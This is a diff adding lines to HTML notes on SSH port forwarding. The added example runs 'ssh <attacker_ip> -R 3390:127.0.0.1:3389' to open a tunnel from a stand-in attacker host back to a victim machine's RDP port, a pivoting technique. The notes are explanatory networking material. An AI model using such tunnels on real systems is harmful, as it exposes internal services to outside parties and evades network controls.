@@ -9,6 +9,10 @@ NB: Remember that you need to be root to bind to TCP port &lt;1024. &nbsp;Higher
 <br/>
 Remote port forwarding: it forwards traffic coming to a remote port to a specified local port. For example, all traffic coming to port 1234 on the server (host) could be forwarded to port 23 on the client (localhost).<br/>
 <br/>
+Remote port forwarding will open a port on the machine you are SSHing to.<br/>
+Machine 1: ssh &lt;attacker_ip&gt; -R 3390:127.0.0.1:3389 will open a listener on the attacker_ip on port 3390, Machine 1 will direct this traffic to 127.0.0.1:3389 on Machine 1<br/>
+Attacker_ip can now browse to 127.0.0.1:3390 and traffic will be forwarded to Machine 1:3389<br/>
+<br/>
 Reverse/Remote SSH Portforwarding:<br/>
 Note that if you use OpenSSH sshd server, the server’s GatewayPorts option needs to be enabled (set to yes or clientspecified - GatewayPorts yes) for this to work (check file /etc/ssh/sshd_config on the server). Otherwise (default value for this option is no), the server will always force port bound on the loopback interface only.<br/>
 <br/>
